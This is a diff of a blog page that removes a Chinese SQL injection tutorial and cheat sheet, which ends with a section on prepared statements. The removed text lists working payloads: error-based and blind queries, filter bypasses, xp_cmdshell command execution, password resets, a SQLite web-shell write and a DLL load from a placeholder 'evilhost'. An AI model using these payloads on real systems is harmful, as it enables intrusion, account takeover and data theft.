-  	<time datetime="2021-04-08T07:50:22.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-08</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h4 id="0×00-前言"><a href="#0×00-前言" class="headerlink" title="0×00 前言"></a>0×00 前言</h4><p><strong>什么是 SQL 注入</strong></p>
-<p>SQL 注入是一种代码注入技术，用于攻击数据驱动的应用程序。 在应用程序中，如果没有做恰当的过滤，则可能使得恶意的 SQL 语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。</p>
-<h4 id="0×01-类型"><a href="#0×01-类型" class="headerlink" title="0×01 类型"></a>0×01 类型</h4><h5 id="1-1-按技巧分类"><a href="#1-1-按技巧分类" class="headerlink" title="1.1 按技巧分类"></a>1.1 按技巧分类</h5><p><strong>根据使用的技巧，SQL 注入类型可分为</strong></p>
-<ul>
-<li>盲注<ul>
-<li>布尔盲注：只能从应用返回中推断语句执行后的布尔值</li>
-<li>时间盲注：应用没有明确的回显，只能使用特定的时间函数来判断</li>
-</ul>
-</li>
-<li>报错注入：应用会显示全部或者部分的报错信息</li>
-<li>堆叠注入：有的应用可以加入  ;  后一次执行多条语句</li>
-<li>其他</li>
-</ul>
-<h5 id="1-2-按数据获取方式分类"><a href="#1-2-按数据获取方式分类" class="headerlink" title="1.2 按数据获取方式分类"></a>1.2 按数据获取方式分类</h5><p><strong>根据获取数据的方式分为 3 类</strong></p>
-<ul>
-<li>inband<ul>
-<li>利用 Web 应用来直接获取数据</li>
-<li>如报错注入</li>
-<li>都是通过站点的响应或者错误反馈来提取数据</li>
-</ul>
-</li>
-<li>inference<ul>
-<li>通过 Web 的一些反映来推断数据</li>
-<li>如布尔盲注和堆叠注入</li>
-<li>也就是我们通俗的盲注，</li>
-<li>通过 web 应用的其他改变来推断数据</li>
-</ul>
-</li>
-<li>out of band(OOB)<ul>
-<li>通过其他传输方式来获得数据，比如 DNS 解析协议和电子邮件</li>
-</ul>
-</li>
-</ul>
-<h4 id="0×02-注入检测"><a href="#0×02-注入检测" class="headerlink" title="0×02 注入检测"></a>0×02 注入检测</h4><h5 id="2-1-常见的注入点"><a href="#2-1-常见的注入点" class="headerlink" title="2.1 常见的注入点"></a>2.1 常见的注入点</h5><ul>
-<li>GET&#x2F;POST&#x2F;PUT&#x2F;DELETE 参数</li>
-<li>X-Forwarded-For</li>
-<li>文件名</li>
-</ul>
-<h5 id="2-2-Fuzz-注入点"><a href="#2-2-Fuzz-注入点" class="headerlink" title="2.2 Fuzz 注入点"></a>2.2 Fuzz 注入点</h5><ul>
-<li>‘ &#x2F; “</li>
-<li>1&#x2F;1</li>
-<li>1&#x2F;0</li>
-<li>and 1&#x3D;1</li>
-<li>“ and “1”&#x3D;”1</li>
-<li>and 1&#x3D;2</li>
-<li>or 1&#x3D;1</li>
-<li>or 1&#x3D;</li>
-<li>‘ and ‘1’&#x3D;’1</li>
-<li>+ - ^ * % &#x2F;</li>
-<li>&lt;&lt; &gt;&gt; || | &amp; &amp;&amp;</li>
-<li>~</li>
-<li>!</li>
-<li>@</li>
-<li>反引号执行</li>
-</ul>
-<h5 id="2-3-测试用常量"><a href="#2-3-测试用常量" class="headerlink" title="2.3 测试用常量"></a>2.3 测试用常量</h5><ul>
-<li>@<a href="/version">@version </a></li>
-<li>@<a href="/servername">@servername </a></li>
-<li>@<a href="/language">@language </a></li>
-<li>@<a href="/spid">@spid </a></li>
-</ul>
-<h5 id="2-4-测试列数"><a href="#2-4-测试列数" class="headerlink" title="2.4 测试列数"></a>2.4 测试列数</h5><p>例如 <a target="_blank" rel="noopener" href="http://www.foo.com/index.asp?id=12+union+select+null,null--">http://www.foo.com/index.asp?id=12+union+select+null,null--</a> ，不断增加  null  至不返回</p>
-<h5 id="2-5-报错注入"><a href="#2-5-报错注入" class="headerlink" title="2.5 报错注入"></a>2.5 报错注入</h5><ul>
-<li>select 1&#x2F;0</li>
-<li>select 1 from (select count(_),concat(version(),floor(rand(0)_2))x from  information_schema.tables group by x)a</li>
-<li>extractvalue(1, concat(0x5c,(select user())))</li>
-<li>updatexml(0x3a,concat(1,(select user())),1)</li>
-<li>exp((SELECT * from(select user())a))</li>
-<li>ST*LatFromGeoHash((select * from(select _ from(select user())a)b))</li>
-<li>GTID_SUBSET(version(), 1)</li>
-</ul>
-<p><strong>基于 geometric 的报错注入</strong></p>
-<ul>
-<li>GeometryCollection((select _ from (select _ from(select user())a)b))</li>
-<li>polygon((select _ from(select _ from(select user())a)b))</li>
-<li>multipoint((select _ from(select _ from(select user())a)b))</li>
-<li>multilinestring((select _ from(select _ from(select user())a)b))</li>
-<li>LINESTRING((select _ from(select _ from(select user())a)b))</li>
-<li>multipolygon((select _ from(select _ from(select user())a)b))</li>
-</ul>
-<blockquote>
-<p>其中需要注意的是，基于 exp 函数的报错注入在 MySQL 5.5.49 后的版本已经不再生效，具体可以参考这个  commit 95825f 。</p>
-</blockquote>
-<blockquote>
-<p>而以上列表中基于 geometric 的报错注入在这个  commit 5caea4  中被修复，在 5.5.x 较后的版本中同样不再生效。</p>
-</blockquote>
-<h5 id="2-6-堆叠注入"><a href="#2-6-堆叠注入" class="headerlink" title="2.6 堆叠注入"></a>2.6 堆叠注入</h5><ul>
-<li>;select 1</li>
-</ul>
-<h5 id="2-7-注释符"><a href="#2-7-注释符" class="headerlink" title="2.7 注释符"></a>2.7 注释符</h5><ul>
-<li><strong>#</strong></li>
-<li>–+</li>
-<li>&#x2F;<em>xxx</em>&#x2F;</li>
-<li>&#x2F;<em>!xxx</em>&#x2F;</li>
-<li>&#x2F;<em>!50000xxx</em>&#x2F;</li>
-</ul>
-<h5 id="2-8-判断过滤规则"><a href="#2-8-判断过滤规则" class="headerlink" title="2.8 判断过滤规则"></a>2.8 判断过滤规则</h5><ul>
-<li>是否有 trunc</li>
-<li>是否过滤某个字符</li>
-<li>是否过滤关键字</li>
-<li>slash 和编码</li>
-</ul>
-<h5 id="2-9-获取信息"><a href="#2-9-获取信息" class="headerlink" title="2.9 获取信息"></a>2.9 获取信息</h5><ul>
-<li><strong>判断数据库类型</strong><br>_ and exists (select _ from msysobjects ) &gt; 0 access 数据库<br>_ and exists (select _ from sysobjects ) &gt; 0 SQLServer 数据库</li>
-<li><strong>判断数据库表</strong><ul>
-<li>and exsits (select * from admin)</li>
-</ul>
-</li>
-<li>版本、主机名、用户名、库名</li>
-<li><strong>表和字段</strong><ul>
-<li>确定字段数<ul>
-<li>Order By</li>
-<li>Select Into</li>
-</ul>
-</li>
-<li>表名、列名</li>
-</ul>
-</li>
-</ul>
-<h5 id="2-10-测试权限"><a href="#2-10-测试权限" class="headerlink" title="2.10 测试权限"></a>2.10 测试权限</h5><ul>
-<li>文件操作<ul>
-<li>读敏感文件</li>
-<li>写 shell</li>
-</ul>
-</li>
-<li>带外通道<ul>
-<li>网络请求</li>
-</ul>
-</li>
-</ul>
-<h4 id="0×03-权限提升"><a href="#0×03-权限提升" class="headerlink" title="0×03 权限提升"></a>0×03 权限提升</h4><h5 id="3-1-UDF-提权"><a href="#3-1-UDF-提权" class="headerlink" title="3.1 UDF 提权"></a>3.1 UDF 提权</h5><p>UDF（User Defined Function，用户自定义函数）是 MySQL 提供的一个功能，可以通过编写 DLL 扩展为 MySQL 添加新函数，扩充其功能。当获得 MySQL 权限之后，即可通过这种方式上传自定义的扩展文件，从 MySQL 中执行系统命令。</p>
-<h4 id="0×04-数据库检测"><a href="#0×04-数据库检测" class="headerlink" title="0×04 数据库检测"></a>0×04 数据库检测</h4><h5 id="4-1-MySQL"><a href="#4-1-MySQL" class="headerlink" title="4.1 MySQL"></a>4.1 MySQL</h5><ul>
-<li>sleep <code>sleep(1)</code></li>
-<li>benchmark <code>BENCHMARK(5000000, MD5(&#39;test&#39;))</code></li>
-<li>字符串连接<ul>
-<li><code>SELECT &#39;a&#39; &#39;b&#39;</code></li>
-<li><code>SELECT CONCAT(&#39;some&#39;,&#39;string&#39;)</code></li>
-</ul>
-</li>
-<li>version<ul>
-<li><code>SELECT @@version</code></li>
-<li><code>SELECT version()</code></li>
-</ul>
-</li>
-<li>识别用函数<ul>
-<li><code>connection_id()</code></li>
-<li><code>last_insert_id()</code></li>
-<li><code>row_count()</code></li>
-</ul>
-</li>
-</ul>
-<h5 id="4-2-Oracle"><a href="#4-2-Oracle" class="headerlink" title="4.2 Oracle"></a>4.2 Oracle</h5><ul>
-<li><strong>字符串连接</strong><ul>
-<li><code>&#39;a&#39;||&#39;oracle&#39; --</code></li>
-<li><code>SELECT CONCAT(&#39;some&#39;,&#39;string&#39;)</code></li>
-</ul>
-</li>
-<li><strong>version</strong><ul>
-<li><code>SELECT banner FROM v$version</code></li>
-<li><code>SELECT banner FROM v$version WHERE rownum=1</code></li>
-</ul>
-</li>
-</ul>
-<h5 id="4-3-SQLServer"><a href="#4-3-SQLServer" class="headerlink" title="4.3 SQLServer"></a>4.3 SQLServer</h5><ul>
-<li>WAITFOR <code>WAITFOR DELAY &#39;00:00:10&#39;;</code></li>
-<li>SERVERNAME <code>SELECT @@SERVERNAME</code></li>
-<li>version <code>SELECT @@version</code></li>
-<li><strong>字符串连接</strong><ul>
-<li><code>SELECT &#39;some&#39;+&#39;string&#39;</code></li>
-</ul>
-</li>
-<li><strong>常量</strong><ul>
-<li><code>@@pack_received</code></li>
-<li><code>@@rowcount</code></li>
-</ul>
-</li>
-</ul>
-<h5 id="4-4-PostgreSQL"><a href="#4-4-PostgreSQL" class="headerlink" title="4.4 PostgreSQL"></a>4.4 PostgreSQL</h5><ul>
-<li>sleep <code>pg_sleep(1)</code></li>
-</ul>
-<h4 id="0×05-绕过技巧"><a href="#0×05-绕过技巧" class="headerlink" title="0×05 绕过技巧"></a>0×05 绕过技巧</h4><h5 id="5-1-编码绕过"><a href="#5-1-编码绕过" class="headerlink" title="5.1 编码绕过"></a>5.1 编码绕过</h5><ul>
-<li>大小写</li>
-<li>url 编码</li>
-<li>html 编码</li>
-<li>十六进制编码</li>
-<li>unicode 编码</li>
-</ul>
-<h5 id="5-2-注释"><a href="#5-2-注释" class="headerlink" title="5.2 注释"></a>5.2 注释</h5><ul>
-<li><code>//</code>  <code>--</code>  <code>--</code>  <code>+</code>  <code>--</code>  <code>-</code>  <code>#</code>  <code>/**/</code>  <code>;%00</code></li>
-<li>内联注释用的更多，它有一个特性<code>/!**/</code> 只有 MySQL 能识别</li>
-<li>e.g. <code>index.php?id=-1 /*!UNION*/ /*!SELECT*/ 1,2,3</code></li>
-</ul>
-<h5 id="5-3-只过滤了一次时"><a href="#5-3-只过滤了一次时" class="headerlink" title="5.3 只过滤了一次时"></a>5.3 只过滤了一次时</h5><ul>
-<li><code>union</code> &#x3D;&gt; <code>ununionion</code></li>
-</ul>
-<h5 id="5-4-相同功能替换"><a href="#5-4-相同功能替换" class="headerlink" title="5.4 相同功能替换"></a>5.4 相同功能替换</h5><ul>
-<li>函数替换<ul>
-<li><code>substring</code> &#x2F; <code>mid</code> &#x2F; <code>sub</code></li>
-<li><code>ascii</code> &#x2F; <code>hex</code> &#x2F; <code>bin</code></li>
-<li><code>benchmark</code> &#x2F; <code>sleep</code></li>
-</ul>
-</li>
-<li>变量替换<ul>
-<li><code>user()</code> &#x2F; <code>@@user</code></li>
-</ul>
-</li>
-<li>符号和关键字<ul>
-<li><code>and</code> &#x2F; <code>&amp;</code></li>
-<li><code>or</code> &#x2F; <code>|</code></li>
-</ul>
-</li>
-</ul>
-<h5 id="5-5-HTTP-参数"><a href="#5-5-HTTP-参数" class="headerlink" title="5.5 HTTP 参数"></a>5.5 HTTP 参数</h5><ul>
-<li>HTTP 参数污染<ul>
-<li><code>id=1&amp;id=2&amp;id=3</code> 根据容器不同会有不同的结果</li>
-</ul>
-</li>
-<li>HTTP 分割注入</li>
-</ul>
-<h5 id="5-6-缓冲区溢出"><a href="#5-6-缓冲区溢出" class="headerlink" title="5.6 缓冲区溢出"></a>5.6 缓冲区溢出</h5><ul>
-<li>一些 C 语言的 WAF 处理的字符串长度有限，超出某个长度后的 payload 可能不会被处理</li>
-</ul>
-<h5 id="5-7-二次注入"><a href="#5-7-二次注入" class="headerlink" title="5.7 二次注入"></a>5.7 二次注入</h5><ul>
-<li>二次注入有长度限制时，通过多句执行的方法改掉数据库该字段的长度绕过</li>
-</ul>
-<h4 id="0×06-SQL-注入小技巧"><a href="#0×06-SQL-注入小技巧" class="headerlink" title="0×06 SQL 注入小技巧"></a>0×06 SQL 注入小技巧</h4><h5 id="6-1-宽字节注入"><a href="#6-1-宽字节注入" class="headerlink" title="6.1 宽字节注入"></a>6.1 宽字节注入</h5><p>一般程序员用 gbk 编码做开发的时候，会用 <code>set names &#39;gbk&#39;</code> 来设定，这句话等同于</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set</span><br><span class="line">character_set_connection = &#x27;gbk&#x27;,</span><br><span class="line">character_set_result = &#x27;gbk&#x27;,</span><br><span class="line">character_set_client = &#x27;gbk&#x27;;</span><br></pre></td></tr></table></figure>
-
-<p>漏洞发生的原因是执行了 <code>set character_set_client = &#39;gbk&#39;;</code> 之后，mysql 就会认为客户端传过来的数据是 gbk 编码的，从而使用 gbk 去解码，而 mysql_real_escape 是在解码前执行的。但是直接用 <code>set names &#39;gbk&#39;</code> 的话 real_escape 是不知道设置的数据的编码的，就会加<code>%5c</code> 。此时 server 拿到数据解码 就认为提交的字符+%5c 是 gbk 的一个字符，这样就产生漏洞了。</p>
-<p>解决的办法有三种，第一种是把 client 的 charset 设置为 binary，就不会做一次解码的操作。第二种是是 <code>mysql_set_charset(&#39;gbk&#39;)</code> ，这里就会把编码的信息保存在和数据库的连接里面，就不会出现这个问题了。 第三种就是用 pdo。</p>
-<p>还有一些其他的编码技巧，比如 latin 会弃掉无效的 unicode，那么 admin%32 在代码里面不等于 admin，在数据库比较会等于 admin。</p>
-<h4 id="0×07-CheatSheet"><a href="#0×07-CheatSheet" class="headerlink" title="0×07 CheatSheet"></a>0×07 CheatSheet</h4><h5 id="7-1-SQL-Server-Payload"><a href="#7-1-SQL-Server-Payload" class="headerlink" title="7.1 SQL Server Payload"></a>7.1 SQL Server Payload</h5><ul>
-<li><strong>Version</strong><ul>
-<li><code>SELECT @@version</code></li>
-</ul>
-</li>
-<li><strong>Comment</strong><ul>
-<li><code>SELECT 1 -- comment</code></li>
-<li><code>SELECT /*comment*/1</code></li>
-</ul>
-</li>
-<li><strong>Space</strong><ul>
-<li><code>0x01 - 0x20</code></li>
-</ul>
-</li>
-<li><strong>Current User</strong><ul>
-<li><code>SELECT user_name()</code></li>
-<li><code>SELECT system_user</code></li>
-<li><code>SELECT user</code></li>
-<li><code>SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID</code><br>**_ List User_</li>
-<li><code>SELECT name FROM master..syslogins</code></li>
-</ul>
-</li>
-<li><strong>Current Database</strong><ul>
-<li><code>SELECT DB_NAME()</code></li>
-</ul>
-</li>
-<li><strong>List Database</strong><ul>
-<li><code>SELECT name FROM master..sysdatabases</code></li>
-</ul>
-</li>
-<li><strong>Command</strong><ul>
-<li><code>EXEC xp_cmdshell &#39;net user&#39;</code></li>
-</ul>
-</li>
-<li><strong>Ascii</strong><ul>
-<li><code>SELECT char(0x41)</code></li>
-<li><code>SELECT ascii(&#39;A&#39;)</code></li>
-<li><code>SELECT char(65)+char(66)</code> &#x3D;&gt; return <code>AB</code></li>
-</ul>
-</li>
-<li><strong>Delay</strong><ul>
-<li><code>WAITFOR DELAY &#39;0:0:3&#39;</code>pause for 3 seconds</li>
-</ul>
-</li>
-<li><strong>Change Password</strong><ul>
-<li><code>ALTER LOGIN [sa] WITH PASSWORD=N&#39;NewPassword&#39;</code></li>
-</ul>
-</li>
-<li><strong>Trick</strong><ul>
-<li><code>id=1 union:select password from:user</code></li>
-</ul>
-</li>
-</ul>
-<h5 id="7-2-MySQL-Payload"><a href="#7-2-MySQL-Payload" class="headerlink" title="7.2 MySQL Payload"></a>7.2 MySQL Payload</h5><ul>
-<li><strong>Version</strong><ul>
-<li><code>SELECT @@version</code></li>
-</ul>
-</li>
-<li><strong>Comment</strong><ul>
-<li><code>SELECT 1 -- comment</code></li>
-<li><code>SELECT 1 # comment</code></li>
-<li><code>SELECT /*comment*/1</code></li>
-</ul>
-</li>
-<li><strong>Space</strong><ul>
-<li><code>0x9</code>  <code>0xa-0xd</code>  <code>0x20</code>  <code>0xa0</code></li>
-</ul>
-</li>
-<li><strong>Current User</strong><ul>
-<li><code>SELECT user()</code></li>
-<li><code>SELECT system_user()</code></li>
-</ul>
-</li>
-<li><strong>List User</strong><ul>
-<li><code>SELECT user FROM mysql.user</code></li>
-</ul>
-</li>
-<li><strong>Current Database</strong><ul>
-<li><code>SELECT database()</code></li>
-</ul>
-</li>
-<li><strong>List Database</strong><ul>
-<li><code>SELECT schema_name FROM information_schema.schemata</code></li>
-</ul>
-</li>
-<li><strong>List Tables</strong><ul>
-<li><code>SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != &#39;mysql&#39; AND table_schema != &#39;information_schema&#39;</code></li>
-</ul>
-</li>
-<li><strong>List Columns</strong><ul>
-<li><code>SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != &#39;mysql&#39; AND table_schema != &#39;information_schema&#39;</code></li>
-</ul>
-</li>
-<li><strong>If</strong> *<code>SELECT if(1=1,&#39;foo&#39;,&#39;bar&#39;);</code> return ‘foo’</li>
-<li><strong>Ascii</strong><ul>
-<li><code>SELECT char(0x41)</code></li>
-<li><code>SELECT ascii(&#39;A&#39;)</code></li>
-<li><code>SELECT 0x414243</code> &#x3D;&gt; <code>return ABC</code></li>
-</ul>
-</li>
-<li><strong>Delay</strong><ul>
-<li><code>sleep(1)</code></li>
-<li><code>SELECT BENCHMARK(1000000,MD5(&#39;A&#39;))</code></li>
-</ul>
-</li>
-<li><strong>Read File</strong><ul>
-<li><code>select @@datadir</code></li>
-<li><code>select load_file(&#39;databasename/tablename.MYD&#39;)</code></li>
-</ul>
-</li>
-<li><strong>Blind</strong><ul>
-<li><code>ascii(substring(str,pos,length)) &amp; 32 = 1</code></li>
-</ul>
-</li>
-<li><strong>Error Based</strong><ul>
-<li><code>select count(*),(floor(rand(0)*2))x from information_schema.tables group by x;</code></li>
-</ul>
-</li>
-<li><strong>Write File</strong><ul>
-<li><code>union select 1,1,1 into outfile &#39;/tmp/demo.txt&#39;</code></li>
-<li><code>union select 1,1,1 into dumpfile &#39;/tmp/demo.txt&#39;</code></li>
-<li>dumpfile 和 outfile 不同在于，outfile 会在行末端写入新行，会转义换行符，如果写入二进制文件，很可能被这种特性破坏</li>
-</ul>
-</li>
-<li><strong>Change Password</strong><ul>
-<li><code>mysql -uroot -e &quot;use mysql;UPDATE user SET password=PASSWORD(&#39;newpassword&#39;) WHERE user=&#39;root&#39;;FLUSH PRIVILEGES;&quot;</code></li>
-</ul>
-</li>
-</ul>
-<h5 id="7-3-PostgresSQL-Payload"><a href="#7-3-PostgresSQL-Payload" class="headerlink" title="7.3 PostgresSQL Payload"></a>7.3 PostgresSQL Payload</h5><ul>
-<li>Version<ul>
-<li><code>SELECT version()</code></li>
-</ul>
-</li>
-<li>Comment<ul>
-<li><code>SELECT 1 -- comment</code></li>
-<li><code>SELECT /*comment*/1</code></li>
-</ul>
-</li>
-<li>Current User<ul>
-<li><code>SELECT user</code></li>
-<li><code>SELECT current_user</code></li>
-<li><code>SELECT session_user</code></li>
-<li><code>SELECT getpgusername()</code></li>
-</ul>
-</li>
-<li>List User<ul>
-<li><code>SELECT usename FROM pg_user</code></li>
-</ul>
-</li>
-<li>Current Database<ul>
-<li><code>SELECT current_database()</code></li>
-</ul>
-</li>
-<li>List Database<ul>
-<li><code>SELECT datname FROM pg_database</code></li>
-</ul>
-</li>
-<li>Ascii<ul>
-<li><code>SELECT char(0x41)</code></li>
-<li><code>SELECT ascii(&#39;A&#39;)</code></li>
-</ul>
-</li>
-<li>Delay<ul>
-<li><code>pg_sleep(1)</code></li>
-</ul>
-</li>
-</ul>
-<h5 id="7-4-Oracle-Payload"><a href="#7-4-Oracle-Payload" class="headerlink" title="7.4 Oracle Payload"></a>7.4 Oracle Payload</h5><ul>
-<li>dump<ul>
-<li><code>SELECT * FROM ALL_TABLES</code></li>
-</ul>
-</li>
-<li>Comment<ul>
-<li><code>--</code></li>
-<li><code>/**/</code></li>
-</ul>
-</li>
-<li>Space<ul>
-<li><code>0x00</code>  <code>0x09</code>  <code>0xa-0xd</code>  <code>0x20</code></li>
-</ul>
-</li>
-</ul>
-<h5 id="7-5-SQLite3-Payload"><a href="#7-5-SQLite3-Payload" class="headerlink" title="7.5 SQLite3 Payload"></a>7.5 SQLite3 Payload</h5><ul>
-<li><strong>Comment</strong><ul>
-<li><code>--</code></li>
-<li><code>/**/</code></li>
-</ul>
-</li>
-<li><strong>Version</strong><ul>
-<li><code>select sqlite_version();</code></li>
-</ul>
-</li>
-<li><strong>Command Execution</strong></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ATTACH DATABASE &#x27;/var/www/lol.php&#x27; AS lol;</span><br><span class="line">CREATE TABLE lol.pwn (dataz text);</span><br><span class="line">INSERT INTO lol.pwn (dataz) VALUES (&#x27;&lt;?system($_GET[&#x27;cmd&#x27;]); ?&gt;&#x27;);--</span><br></pre></td></tr></table></figure>
-
-<p>**_ Load_extension_</p>
-<ul>
-<li><code>UNION SELECT 1,load_extension(&#39;\\evilhost\evil.dll&#39;,&#39;E&#39;);--</code></li>
-</ul>
-<h4 id="0×08-预编译"><a href="#0×08-预编译" class="headerlink" title="0×08 预编译"></a>0×08 预编译</h4><h5 id="8-1-简介"><a href="#8-1-简介" class="headerlink" title="8.1 简介"></a>8.1 简介</h5><p>SQL 注入是因为解释器将传入的数据当成命令执行而导致的，预编译是用于解决这个问题的一种方法。和普通的执行流程不同，预编译将一次查询通过两次交互完成，第一次交互发送查询语句的模板，由后端的 SQL 引擎进行解析为 AST 或 Opcode，第二次交互发送数据，代入 AST 或 Opcode 中执行。因为此时语法解析已经完成，所以不会再出现混淆数据和代码的过程。</p>
-<h5 id="8-2-模拟预编译"><a href="#8-2-模拟预编译" class="headerlink" title="8.2 模拟预编译"></a>8.2 模拟预编译</h5><p>为了防止低版本数据库不支持预编译的情况，模拟预编译会在客户端内部模拟参数绑定的过程，进行自定义的转义。</p>
-<h5 id="8-3-绕过"><a href="#8-3-绕过" class="headerlink" title="8.3 绕过"></a>8.3 绕过</h5><p><strong>预编译使用错误</strong><br>预编译只是使用占位符替代的字段值的部分，如果第一次交互传入的命令使用了字符串拼接，使得命令是攻击者可控的，那么预编译不会生效。</p>
-<p><strong>部分参数不可预编译</strong><br>在有的情况下，数据库处理引擎会检查数据表和数据列是否存在，因此数据表名和列名不能被占位符所替代。这种情况下如果表名和列名可控，则可能引入漏洞。</p>
-<p><strong>预编译实现错误</strong><br>部分语言引擎在实现上存在一定问题，可能会存在绕过漏洞。</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/04/08/%E6%BC%8F%E6%B4%9E%E6%94%BB%E9%98%B2%E7%B3%BB%E5%88%97-SQL%E6%B3%A8%E5%85%A5/">展开全文 >></a>
         </p>
       
 
@@ -2319,11 +1168,39 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">web</a>
+                <a href="javascript:void(0)" class="js-tag color3">漏洞</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">漏洞</a>
+                <a href="javascript:void(0)" class="js-tag color3">靶场</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">安全</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">蜜罐</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">漏洞扫描</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">指南</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">SRC</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">思路</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">web</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -2335,6 +1212,18 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">python</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">目录结构</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">协程</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">AI</a>
               </li>
              
@@ -2343,11 +1232,35 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">资产扫描</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">资产探测</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">攻击</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">原理</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">甲方安全</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">漏洞管理</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">SQL注入</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">进程</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -2360,6 +1273,14 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">文件上传</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">线程</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">探测</a>
               </li>
             
             <div class="clearfix"></div>
